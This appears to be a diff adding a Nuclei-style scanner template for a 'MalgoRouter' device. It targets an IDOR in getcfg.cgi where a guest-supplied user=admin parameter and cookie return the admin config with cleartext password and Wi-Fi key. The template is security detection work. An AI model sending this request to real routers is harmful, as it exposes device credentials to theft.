@@ -1,0 +1,34 @@
+id: malgorouter-getcfg-idor
+
+info:
+  name: MalgoRouter getcfg.cgi - Cleartext Secret Export / IDOR
+  author: opencode
+  severity: high
+  description: |
+    /cgi-bin/getcfg.cgi selects which config to return from the client
+    controlled identity (X-Session-User header, session_user cookie, or
+    ?user=). A guest can request the admin config and receive
+    /etc/device.conf with cleartext admin_password and wifi_psk.
+  classification:
+    cwe-id: CWE-639
+  metadata:
+    max-request: 1
+    product: malgorouter
+    vendor: glinet
+  tags: malgorouter,idor,exposure,cwe-639,cwe-200
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/cgi-bin/getcfg.cgi?user=admin"
+    headers:
+      Cookie: "session_user=admin"
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "admin_password="
+      - type: status
+        status:
+          - 200
